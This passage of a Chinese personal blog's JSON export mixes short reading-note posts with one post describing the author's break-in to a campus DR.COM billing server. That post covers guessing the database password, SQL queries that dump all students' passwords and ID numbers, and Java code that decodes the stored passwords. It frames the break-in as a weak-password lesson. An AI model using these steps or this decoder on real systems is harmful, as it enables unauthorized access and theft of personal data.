} } private function checkSignature() { $signature = $_GET[\"signature\"]; $timestamp = $_GET[\"timestamp\"]; $nonce = $_GET[\"nonce\"]; $token = TOKEN; $tmpArr = array($token, $timestamp, $nonce); sort($tmpArr); $tmpStr = implode( $tmpArr ); $tmpStr = sha1( $tmpStr ); if( $tmpStr == $signature ){ return true; }else{ return false; } } } ?> ` `[公众平台开发接口介绍](http://mp.weixin.qq.com/wiki/home/index.html \"公众平台开发接口介绍\")`","categories":[{"name":"Operations","slug":"Operations","permalink":"http://blog.dragon-yuan.me/categories/Operations/"}],"tags":[]},{"title":"人生最高感知能力","slug":"2015-04-21-08-50-39","date":"2015-04-21T00:50:39.000Z","updated":"2016-12-23T08:27:40.727Z","comments":true,"path":"2015/04/21/2015-04-21-08-50-39/","link":"","permalink":"http://blog.dragon-yuan.me/2015/04/21/2015-04-21-08-50-39/","excerpt":"","text":"1. 不只讲功能，还重设计。 2. 不只有论点，还说故事。 3. 不只谈专业，还须整合。 4. 不只讲逻辑，还给关怀。 5. 不只能正经，还会玩乐。 6. 不只顾赚钱，还重意义。","categories":[{"name":"Reading","slug":"Reading","permalink":"http://blog.dragon-yuan.me/categories/Reading/"}],"tags":[]},{"title":"颠覆式的伟大想法","slug":"2015-04-21-08-50-06","date":"2015-04-21T00:50:06.000Z","updated":"2016-12-23T08:27:32.310Z","comments":true,"path":"2015/04/21/2015-04-21-08-50-06/","link":"","permalink":"http://blog.dragon-yuan.me/2015/04/21/2015-04-21-08-50-06/","excerpt":"","text":"王东岳曾经有一个理想，他说如果有可能，希望能够有这样的一所大学：在这所大学里，没有必修课，全是选修课；没有专业，每个人根据自己的禀赋，去选想学的专业，组合起来成为个人独一无二的专业。","categories":[{"name":"Reading","slug":"Reading","permalink":"http://blog.dragon-yuan.me/categories/Reading/"}],"tags":[]},{"title":"产品型社群","slug":"2015-04-21-08-49-39","date":"2015-04-21T00:49:39.000Z","updated":"2016-12-23T08:27:26.572Z","comments":true,"path":"2015/04/21/2015-04-21-08-49-39/","link":"","permalink":"http://blog.dragon-yuan.me/2015/04/21/2015-04-21-08-49-39/","excerpt":"","text":"功能成为标配，情感成为强需；中间成本趋零，二次打击盈利；个人异端化，组织社群化。 我们处于一个新时代的来临，这是一个降维化生存的时代，一个方生方死的时代，一个颠覆式的时代，一个超时空获取资源的时代，一个审美的时代，一个灵性回归的时代。 人欲即天理，更现实的人生观。 顺势而为，不要做逆天的事情。 颠覆创新，用互联网精神重新思考。 广结善缘，中国是人情社会。 专注，少就是多。 我们必须首先从用户天怒发继而再回头考虑技术上的可行性。 永远不厌其烦地改，越改越有温度感，越改就越知道下一步往哪里走，这本来就是一个没有终点的过程。 比尖叫值更可怕的是动态尖叫值。你今天达到了这个尖叫度，明天达到同样的尖叫度，用户就不叫了，你要永远穿越用户的预期。 产品是演化出来的，而非规划出来的。 你只有把自己逼疯，才可能把别人逼死。 少做一点事情，把这些事情做到极致，就是最好的策略。 匠人精神：专注做点东西，至少对得起光阴、岁月。其他的就留给时间去说吧！ 传统厂商是在卖产品，而互联网公司是在建社群。 只有站在比他人更高的地方，才能真正的理解他人。 如果把互联网当作工具，就永远理解不了互联网的真谛；如果把互联网当做思维，就能产生巨大的商业价值。 一辈子，总得做点对得起光阴的事情。","categories":[{"name":"Reading","slug":"Reading","permalink":"http://blog.dragon-yuan.me/categories/Reading/"}],"tags":[]},{"title":"基于DR.COM端口弱口令的研究","slug":"dr-com","date":"2015-04-16T19:52:55.000Z","updated":"2016-12-23T08:31:41.757Z","comments":true,"path":"2015/04/17/dr-com/","link":"","permalink":"http://blog.dragon-yuan.me/2015/04/17/dr-com/","excerpt":"","text":"由于校园网采用DR.COM城市热点服务端，加上校园网速未能像往常一样快速畅通。以至于萌发突破校园网终端的想法。研究方法通过服务器后台突破，端口突破，数据库突破，以及管理员加密算法方式的研究。 突破服务器后台，首先需要知道学院充值的网址URL，http://172.23.0.18/Self/nav_login 这样我们就知道了他服务器的主页首地址，也就是172.23.0.18。一看是用了Apache Tomcat的服务器后台。那就通过暴力搜索后台网址就好了。会发现有用的URL没有多少，闲话不多说了。想必管理人员会对下图比较熟悉吧。 但是看到帐号和密码就比较费脑筋了，随便试了几个，都不行，看来这个不是容易随便就能登录的，看了下这个主页的代码。发现用的是javascript的脚本辅助登录。 if(parseInt(trytimes)&gt;=3){$(“#tr_random”).show();}也就是说如果尝试登录3次以上就会出现验证码，以防Demo等软件尝试进入。这里’or’=’or’也无法尝试登录，看来城市热点还是比较firewall的。 剩下的难点就是突破登录平台方面了，查找后台URL。发现有一个是数据库的页面，仔细观察一看这个Oracle 10g的版本。也能看出数据库的端口号是1521。账户名USER为drcom，密钥是**，但是也重在尝试吧，USER= PASSWD。成功。 Dll：ocijdbc9。 然后就可以开始尝试在本地连接远程数据库了，知道了用户名，密码，和端口号，剩下的就很简单也很容易了。 查看下当前用户下的所有表： SELECT * FROM USER_TABLES; 会展示所有的用户表，其次在查询表中数据。 SELECT a. FROM TBLREGISTERUSERA a UNION ALL SELECT b. FROM TBLREGISTERUSERSHISTORY b; 会查询到所有的学院学生的登录信息和密码，甚至还有身份证号，这弱口令造成的问题会是相当的可怕想必大家都会知道的。 在搜索下关于ADMIN方面的表。查询到USER_DATA中有一个表很有用，查询一下它会发现令人激动的信息！这简直太爽了，就像是一个陌生人不用钥匙就打开了你们家的锁，所有他想得到的东西他都会得到。 SELECT * FROM TBLADMINISTRATORS; 剩下的就是加密算法的研究了。这部分最令人头疼。但是学校初始密码为123，相对应用户表中最多的数据来看，123密码对应的加密方式为Mk*a，在仔细观察每一加密后的加密结尾都为a，也就是说a为输入两次密码后已经确认后的加密方式，如果是b结尾也就代表已被注销的用户。下面是自己写的一个3位数加密解密的代码（纯属无聊）。 import java.util.Scanner; public class Passwd { staticString passwd_ascii; staticString pwd; publicstatic void main(String[] args) { System.out.println(“PleaseInput The Passwd :”); Scannersc = new Scanner(System.in); Stringpasswd = sc.nextLine(); System.out.println(“ToChange Ascii Of The Passwd To The PasswdAscii :”); PasswdAscii(passwd); } privatestatic String PasswdAscii(String passwdtext) { //TODO Auto-generated method stub charascii[] = new char[20]; charlastChar = passwdtext.charAt(passwdtext.length() - 1); if(lastChar != ‘a’) { for(int i = 0; i &lt; passwdtext.length(); i++) { ascii[i]= passwdtext.charAt(i);// 转换成ASCII码 //(int)转换成ASCII码，但存放到String中 if(i == 0) { passwd_ascii= String.valueOf((int) ascii[i] - 28);// (int)转换成ASCII码，第0位 }else if (i == 1) { passwd_ascii= String.valueOf((int) ascii[i] - 28 - 29);// (int)转换成ASCII码，第1位 }else if (i == 2) { passwd_ascii= String.valueOf((int) ascii[i] - 28 - 29 - 30 +126 - 30);// (int)转换成ASCII码，第2位 }else if (i == 3) { passwd_ascii= String.valueOf((int) ascii[i] - 28 - 29 - 30 +126 - 30 - 28);// (int)转换成ASCII码，第2位 } System.out.print(passwd_ascii+ “\\t”); System.out.print(“ThePassword is :”); PasswordString(passwd_ascii); System.out.println(); } System.out.println(); }else { for(int i = 0; i &lt; passwdtext.length() - 1; i++) { ascii[i]= passwdtext.charAt(i);// 转换成ASCII码 //(int)转换成ASCII码，但存放到String中 if(i == 0) { passwd_ascii= String.valueOf((int) ascii[i] - 28);// (int)转换成ASCII码，第0位 }else if (i == 1) { passwd_ascii= String.valueOf((int) ascii[i] - 28 - 29);// (int)转换成ASCII码，第1位 }else if (i == 2) { passwd_ascii= String.valueOf((int) ascii[i] - 28 - 29 - 30 +126 - 30);// (int)转换成ASCII码，第2位 }else if (i == 3) { passwd_ascii= String.valueOf((int) ascii[i] - 28 - 29 - 30 +126 - 30 - 28);// (int)转换成ASCII码，第2位 } System.out.print(passwd_ascii+ “\\t”); System.out.print(“ThePassword is :”); PasswordString(passwd_ascii); System.out.println(); } System.out.println(“NULL!”); } returnpasswd_ascii; } privatestatic String PasswordString(String passwd_ascii) { pwd= passwd_ascii; for(int i = 0; i &lt; 1; i++) { //String -&gt; int -&gt; char -&gt; LASTPWD intIntPwd = Integer.parseInt(pwd); charLASTPWD = (char) (IntPwd); System.out.print(LASTPWD+”\\t”); } returnpwd; } } // 每个字符加密后ASCII都是在32-126之间，从第一位开始加28，第二位加28+29，第三位加28+29+30，如果超过126的部分，则返回32开始。 最后，通过这一次的尝试，我想说弱口令真的很可怕，希望我的朋友们在设置您的密码的时候最好都不要使用到弱口令，您的信息安全特别重要，请误告诉他人。 纯属测试，请勿用于非法、商务途径，后果自负。","categories":[{"name":"Operations","slug":"Operations","permalink":"http://blog.dragon-yuan.me/categories/Operations/"}],"tags":[]},{"title":"颠覆式创新","slug":"2015-04-16-13-57-39","date":"2015-04-16T05:57:39.000Z","updated":"2016-12-23T08:27:20.640Z","comments":true,"path":"2015/04/16/2015-04-16-13-57-39/","link":"","permalink":"http://blog.dragon-yuan.me/2015/04/16/2015-04-16-13-57-39/","excerpt":"","text":"只有当少数人把多数人的观点推翻了，科学才会进步。 换操作系统就是换思想（思维）打补丁仅仅是解决问题。 要经常思考一下某个体系的外边是什么。 有一股向上的力量推着持续性技术公司往更高的技术方向发展，势不可挡，但是最终，他们会被困于技术的牢笼，无法挣脱。 当技术追求更高、更快、更强的时候，也就带动了从技术进步到产品功能的进步。 与其更好，不如不同。产品至简，成本至简。 你满足了人性的弱点，其实就抓住了巨大的商机。 今天这个时代只要做好一件事就能改变世界，哪怕这个事很小，只要做的足够深，就可以改变世界。 在互联网时代，做过去的东西，就算做的再好也没有未来。 工商业时代是经典管理的领导者，互联网时代是新思维的开拓者。 不要总以为你的队友是友商，其实你的对手是时代。 软弱和无知不是生存的障碍，傲慢才是。 任何事物都有两面性，对于创新而言，流程和价值观起阻碍作用。","categories":[{"name":"Reading","slug":"Reading","permalink":"http://blog.dragon-yuan.me/categories/Reading/"}],"tags":[]},{"title":"互联网世界观","slug":"2015-04-13-05-02-28","date":"2015-04-12T21:02:28.000Z","updated":"2016-12-23T08:27:02.462Z","comments":true,"path":"2015/04/13/2015-04-13-05-02-28/","link":"","permalink":"http://blog.dragon-yuan.me/2015/04/13/2015-04-13-05-02-28/","excerpt":"","text":"时代变化的时候，你用旧的世界观来看新世界，你一定是拧巴。 能够开启新世界的往往都是新的见识，而不是旧的尝试。 没有量子力学就没有芯片，就没有计算机，就没有互联网，就没有智能手机，这是影响我们今天生活最重要的一门科学，可惜我们日常生活接触不到。 原子世界和比特世界是一回事，互联网是新的工具，还是新的世界，这就是世界观。 移动互联网宛如一个量子世界，我们成为彼此连接的量子，这个连接使我们的时代发生了巨大的变化。 今天存在着两个世界，你从哪个世界着手都可以，但让你自己固守在一个世界里面，则相当于把自己的眼睛蒙起来，怪不得别人。 能量和质量可以互相转换，所以它们是一回事，小质量可以产生大能量。换句话说，你不需要很大的质量，也能产生很大的能量。 产品是入口，用户是资产，社群是商业模式。 新创企业必须在消耗完启动资金之前，以最小的成本，在最短的时间里找到有价值的认知。 今天做事情千万不要怕小，千万不要求大，在一个小的地方验证成功了，然后在推广出去，这是精益创业的方式。 竞争是最好的学习方式。 移动互联网的时代，传统企业要任用年轻人成为唯一的选择，把年轻人变成企业的主人成为最大的挑战。","categories":[{"name":"Reading","slug":"Reading","permalink":"http://blog.dragon-yuan.me/categories/Reading/"}],"tags":[]},{"title":"2015 - Dragon's Life","slug":"gallery-mylife-2015","date":"2014-12-31T16:00:00.000Z","updated":"2017-11-24T14:55:36.628Z","comments":true,"path":"2015/01/01/gallery-mylife-2015/","link":"","permalink":"http://blog.dragon-yuan.me/2015/01/01/gallery-mylife-2015/","excerpt":"","text":"","categories":[{"name":"Gallery","slug":"Gallery","permalink":"http://blog.dragon-yuan.me/categories/Gallery/"}],"tags":[]}]}